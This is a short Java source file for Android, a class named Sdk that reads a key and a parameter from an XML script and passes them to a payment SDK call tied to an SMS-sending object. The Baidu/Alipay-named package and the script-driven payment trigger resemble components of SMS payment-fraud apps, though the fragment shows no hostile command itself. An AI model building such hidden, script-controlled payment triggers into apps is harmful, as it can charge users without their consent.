package com.baidu.alipay.script;

import java.util.List;

import com.baidu.alipay.script.sdk.SdkFactory;
import com.baidu.alipay.script.sdk.SdkResult;

import android.content.Context;

public class Sdk extends Tags{

	private static final String KEY = "key";
	private static final String PARAM = "param";
	
	private String key;
	
	private String param;
	
	public Sdk(String xml,boolean dynamic){
		this.key = getNodeValue(xml, KEY);
		this.param = getNodeValue(xml, PARAM);
		this.dynamic = dynamic;
	}
	
	@Override
	public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
		
		SdkResult sdkResult = SdkFactory.pay(context,key,param,sendSms.getSyncParam().getRefer());

		if(sdkResult.isSucc()){
			return TAGS_EXEC_SUCC;
		}else{
			this.errorReason = sdkResult.getReason();
			return TAGS_EXEC_FAIL;
		}
	}

	@Override
	public String getTag() {
		return TAGS_SDK;
	}
}
